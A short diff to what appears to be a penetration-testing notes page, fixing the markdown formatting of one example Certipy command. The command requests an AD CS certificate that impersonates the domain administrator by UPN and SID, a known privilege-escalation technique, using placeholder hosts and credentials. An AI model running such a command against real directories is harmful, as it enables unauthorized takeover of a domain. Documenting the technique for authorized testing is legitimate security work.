@@ -133,7 +133,7 @@ certipy req -dc-ip '<DC_IP>' -u '<USER>@<DOMAIN>' -p '<PASSWD>' -target '<TARGET
 > [!DANGER]- *e.g.*
 >
 > ```bash
-certipy req -dc-ip '10.10.10.5' -u 'john.doe@DOMAIN.INTERNAL' -p 'password1234$!' -target 'DC01.DOMAIN.INTERNAL' -ca 'DOMAIN-CA' -template 'SampleTemplate' -upn 'administrator@DOMAIN.INTERNAL' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
+> certipy req -dc-ip '10.10.10.5' -u 'john.doe@DOMAIN.INTERNAL' -p 'password1234$!' -target 'DC01.DOMAIN.INTERNAL' -ca 'DOMAIN-CA' -template 'SampleTemplate' -upn 'administrator@DOMAIN.INTERNAL' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
 > ```
 >
 
